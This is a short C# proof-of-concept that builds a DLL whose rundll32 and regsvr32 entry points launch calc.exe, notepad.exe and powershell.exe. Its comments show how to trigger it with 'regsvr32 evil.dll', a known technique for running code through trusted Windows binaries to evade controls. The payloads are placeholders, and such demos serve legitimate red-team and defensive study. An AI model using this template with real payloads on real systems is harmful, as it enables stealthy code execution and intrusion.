using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using RGiesecke.DllExport;

namespace Export
{
    class Test
    {

        //
        // 
        //rundll32 entry point
        [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
        public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow )
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "calc.exe";
            Process.Start(info);
        }
        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllRegisterServer()
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "notepad.exe";
            Process.Start(info);
        }
        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllUnregisterServer()
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "powershell.exe";
            Process.Start(info);
        }

        // To call/execute simply 
        // regsvr32 /u evil.dll -->Calls DllUnregisterServer
        // [OR] 
        // regsvr32 evil.dll --> Calls DllRegisterServer


    }
}
